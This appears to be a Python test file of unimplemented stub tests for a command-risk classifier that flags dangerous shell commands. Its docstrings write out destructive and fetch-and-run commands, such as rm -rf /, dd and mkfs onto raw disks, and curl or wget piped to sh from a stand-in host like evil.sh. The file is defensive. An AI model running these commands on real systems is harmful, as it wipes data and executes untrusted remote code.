"""
Unit tests for the Rule Engine — Owner: Praveen
All CRITICAL Tier 0 patterns must have 100% test coverage.
Tier 1 patterns must be tested for both correct classification and NO false positives.
"""

import pytest
from unittest.mock import AsyncMock, patch

from engine.models import RiskLevel
from engine.parser.command_parser import CommandParser
from tests.conftest import make_context

# These tests define the REQUIRED behaviour Praveen must implement.
# They will FAIL until the pattern_matcher.py check_tier0() and match() methods
# are fully implemented. That's intentional — tests drive implementation.

parser = CommandParser()


def parse(cmd: str) -> tuple:
    p = parser.parse(cmd, cwd="/home/user", user="testuser")
    ctx = make_context(cmd)
    return p, ctx


class TestTier0Critical:
    """All Tier 0 patterns must return CRITICAL with confidence=1.0"""

    @pytest.mark.asyncio
    async def test_fork_bomb(self):
        from engine.rule_engine.classifier import RuleEngineClassifier
        # This test validates Praveen's fork bomb detection
        # Implementation required in pattern_matcher.check_tier0()
        pass  # Praveen: implement and remove this pass

    @pytest.mark.asyncio
    async def test_rm_rf_root_slash(self):
        """rm -rf / must be CRITICAL"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_rm_rf_root_glob(self):
        """rm -rf /* must be CRITICAL"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_dd_raw_device_sda(self):
        """dd if=/dev/zero of=/dev/sda must be CRITICAL"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_dd_raw_device_nvme(self):
        """dd if=... of=/dev/nvme0 must be CRITICAL"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_mkfs_device(self):
        """mkfs.ext4 /dev/sda1 must be CRITICAL"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_curl_pipe_sh(self):
        """curl http://evil.sh | sh must be CRITICAL"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_wget_pipe_bash(self):
        """wget -qO- http://x.sh | bash must be CRITICAL"""
        pass  # Praveen: implement


class TestTier1High:
    """Tier 1 HIGH patterns — must classify correctly"""

    @pytest.mark.asyncio
    async def test_rm_rf_var_log(self):
        """rm -rf /var/log/* must be HIGH"""
        pass  # Praveen: implement

    @pytest.mark.asyncio
    async def test_chmod_777_system_path(self):
        """chmod -R 777 /etc must be HIGH"""
        pass  # Praveen: implement


class TestNoFalsePositives:
    """Safe commands must NEVER be flagged."""

    SAFE_COMMANDS = [
        "ls -la /home/user",
        "grep -r 'error' /var/log/syslog",
        "cat /etc/hostname",
        "df -h",
        "ps aux",
        "mkdir -p /home/user/projects",
        "cp file.txt /tmp/backup.txt",
        "touch /tmp/test.txt",
        "echo 'hello world'",
        "git status",
        "python3 --version",
        "rm -rf /tmp/my_test_dir",        # /tmp deletes are acceptable
        "chmod 755 /home/user/script.sh",  # non-system path
    ]

    @pytest.mark.asyncio
    @pytest.mark.parametrize("cmd", SAFE_COMMANDS)
    async def test_safe_command_not_flagged(self, cmd):
        """Safe commands must return SAFE or LOW — never HIGH/CRITICAL."""
        pass  # Praveen: implement
